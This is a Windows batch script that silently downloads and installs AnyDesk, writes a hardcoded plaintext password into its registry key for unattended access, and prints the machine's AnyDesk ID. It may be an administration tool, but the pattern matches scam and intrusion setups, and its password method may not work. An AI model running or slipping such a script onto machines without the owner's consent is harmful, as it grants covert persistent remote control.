@echo off
setlocal

set PASSWORD=nk0ckhun9

echo [1/4] Downloading AnyDesk...
powershell -Command "Invoke-WebRequest -Uri 'https://download.anydesk.com/AnyDesk.exe' -OutFile '%TEMP%\AnyDesk.exe'"

echo [2/4] Launching AnyDesk installer...
"%TEMP%\AnyDesk.exe" --install "C:\Program Files (x86)\AnyDesk"

echo [3/4] Verifying installation...
if exist "C:\Program Files (x86)\AnyDesk\AnyDesk.exe" (
    echo [✓] AnyDesk installed.
) else (
    echo [✗] AnyDesk installation failed.
    pause
    exit /b
)

echo [4/4] Setting password...
powershell -Command "$p = '%PASSWORD%'; $bytes = [System.Text.Encoding]::UTF8.GetBytes($p); Set-ItemProperty -Path 'HKLM:\SOFTWARE\AnyDesk' -Name 'Password' -Value $bytes"

FOR /F "tokens=3*" %%A IN ('reg query "HKLM\SOFTWARE\AnyDesk" /v Alias 2^>nul') DO (
    echo AnyDesk ID: %%A
)

echo All done.
pause
